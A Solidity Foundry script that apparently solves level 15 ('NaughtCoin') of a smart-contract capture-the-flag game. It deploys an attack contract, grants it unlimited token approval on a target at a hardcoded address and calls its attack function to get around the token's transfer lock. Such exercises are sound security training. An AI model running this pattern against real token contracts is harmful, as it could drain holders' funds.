// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Level15A} from "../src/Level15A.sol";
import {NaughtCoin} from "../src/Level15.sol";

contract Level15Script is Script {
    address addr = 0xd077854D0aE164342f7261A3010F4C4f1411eeD5;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        Level15A a = new Level15A();
        NaughtCoin c = NaughtCoin(addr);
        c.approve(address(a), type(uint256).max);
        a.attack();
        vm.stopBroadcast();
    }
}
